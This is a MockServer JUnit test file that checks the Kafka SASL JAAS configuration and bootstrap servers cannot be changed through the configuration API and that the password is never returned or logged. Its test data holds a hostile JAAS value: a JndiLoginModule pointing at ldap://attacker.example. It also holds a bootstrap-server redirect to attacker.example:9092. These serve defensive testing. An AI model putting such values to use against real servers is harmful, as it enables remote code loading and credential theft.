package org.mockserver.configuration;

import org.junit.After;
import org.junit.Before;
import org.junit.Test;
import org.mockserver.log.model.LogEntry;
import org.mockserver.logging.MockServerLogger;
import org.mockserver.mock.HttpState;
import org.mockserver.scheduler.Scheduler;
import org.mockserver.serialization.ObjectMapperFactory;
import org.mockserver.serialization.model.ConfigurationDTO;
import org.slf4j.event.Level;

import java.util.List;
import java.util.concurrent.CopyOnWriteArrayList;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;

import static org.hamcrest.MatcherAssert.assertThat;
import static org.hamcrest.Matchers.*;
import static org.mockito.Mockito.mock;
import static org.mockito.Mockito.when;
import static org.mockserver.configuration.Configuration.configuration;

/**
 * A Kafka JAAS configuration names the login module class the Kafka client loads and carries the SASL password, so
 * {@code asyncKafkaSaslJaasConfig} is startup-only and write-only: {@code PUT /mockserver/configuration} never applies
 * it (and says so), and {@code GET /mockserver/configuration} never returns it.
 */
// @ParallelStateGuardSuppress: isSensitivePropertyName(...) is a pure static predicate; every other value is set on a
// local Configuration instance, so the static store is never mutated
public class AsyncKafkaSaslJaasConfigStartupOnlyTest {

    private static final String STARTUP_JAAS = "org.apache.kafka.common.security.plain.PlainLoginModule required"
        + " username=\"alice\" password=\"startup-secret\";";
    private static final String PUT_JAAS = "com.sun.security.auth.module.JndiLoginModule required"
        + " user.provider.url=\"ldap://attacker.example/o=x\";";

    private static class CapturingMockServerLogger extends MockServerLogger {
        private final List<String> warnings = new CopyOnWriteArrayList<>();

        CapturingMockServerLogger(Configuration configuration) {
            super(configuration, AsyncKafkaSaslJaasConfigStartupOnlyTest.class);
        }

        @Override
        public void logEvent(LogEntry logEntry) {
            if (logEntry.getLogLevel() == Level.WARN) {
                warnings.add(String.valueOf(logEntry.getMessage()));
            }
            super.logEvent(logEntry);
        }
    }

    private ScheduledExecutorService schedulerExecutor;
    private Configuration configuration;
    private CapturingMockServerLogger logger;
    private HttpState httpState;

    @Before
    public void createHttpState() {
        configuration = configuration().logLevel(Level.WARN).asyncKafkaSaslJaasConfig(STARTUP_JAAS).asyncKafkaBootstrapServers("broker:9092");
        logger = new CapturingMockServerLogger(configuration);
        schedulerExecutor = Executors.newScheduledThreadPool(1);
        Scheduler scheduler = mock(Scheduler.class);
        when(scheduler.getExecutorService()).thenReturn(schedulerExecutor);
        httpState = new HttpState(configuration, logger, scheduler);
    }

    @After
    public void stop() {
        httpState.stop();
        schedulerExecutor.shutdownNow();
    }

    @Test
    public void shouldIgnoreAndWarnWithoutShowingEitherValueWhenAPutSuppliesIt() throws Exception {
        put(ObjectMapperFactory.createObjectMapper().readValue(
            "{\"asyncKafkaSaslJaasConfig\":" + ObjectMapperFactory.createObjectMapper().writeValueAsString(PUT_JAAS) + "}",
            ConfigurationDTO.class));

        assertThat(configuration.asyncKafkaSaslJaasConfig(), is(STARTUP_JAAS));
        assertThat(logger.warnings, hasSize(1));
        assertThat(logger.warnings.get(0), containsString("asyncKafkaSaslJaasConfig is fixed at startup"));
        assertThat(logger.warnings.get(0), containsString("login module class"));
        assertThat(logger.warnings.get(0), not(containsString("JndiLoginModule")));
        assertThat(logger.warnings.get(0), not(containsString("startup-secret")));
    }

    @Test
    public void shouldNotWarnWhenAPutEchoesTheValueInForce() {
        put(new ConfigurationDTO().setAsyncKafkaSaslJaasConfig(STARTUP_JAAS));

        assertThat(logger.warnings, is(empty()));
    }

    @Test
    public void shouldFixTheBootstrapServersAtStartup() {
        put(new ConfigurationDTO().setAsyncKafkaBootstrapServers("attacker.example:9092"));

        assertThat(configuration.asyncKafkaBootstrapServers(), is("broker:9092"));
        assertThat(logger.warnings, hasSize(1));
        assertThat(logger.warnings.get(0), containsString("asyncKafkaBootstrapServers is fixed at startup"));
        assertThat(logger.warnings.get(0), containsString("held by the server"));
        assertThat(logger.warnings.get(0), not(containsString("startup-secret")));
    }

    @Test
    public void shouldFixTheBootstrapServersAtStartupEvenWithoutAJaas() {
        // a SASL request can still use the JVM's own JAAS login configuration, which is also held by the server
        Configuration withoutJaas = configuration().asyncKafkaBootstrapServers("broker:9092");

        new ConfigurationDTO().setAsyncKafkaBootstrapServers("other:9092").applyTo(withoutJaas);

        assertThat(withoutJaas.asyncKafkaBootstrapServers(), is("broker:9092"));
    }

    @Test
    public void shouldNotWarnWhenAPutEchoesTheBootstrapServersInForce() {
        put(new ConfigurationDTO().setAsyncKafkaBootstrapServers("broker:9092"));

        assertThat(logger.warnings, is(empty()));
    }

    @Test
    public void shouldNeverReturnItFromGetConfiguration() throws Exception {
        String json = ObjectMapperFactory.createObjectMapper().writeValueAsString(new ConfigurationDTO(configuration));

        assertThat(json, not(containsString("asyncKafkaSaslJaasConfig")));
        assertThat(json, not(containsString("startup-secret")));
    }

    @Test
    public void shouldBeTreatedAsSensitiveWhenPrinted() {
        assertThat(ConfigurationProperties.isSensitivePropertyName("mockserver.asyncKafkaSaslJaasConfig"), is(true));
    }

    @Test
    public void shouldBuildAStartupConfigurationCarryingIt() {
        assertThat(new ConfigurationDTO().setAsyncKafkaSaslJaasConfig(STARTUP_JAAS).buildObject().asyncKafkaSaslJaasConfig(), is(STARTUP_JAAS));
    }

    private void put(ConfigurationDTO supplied) {
        logger.warnings.clear();
        supplied.applyTo(configuration);
        httpState.applyConfigurationUpdate(supplied);
    }
}
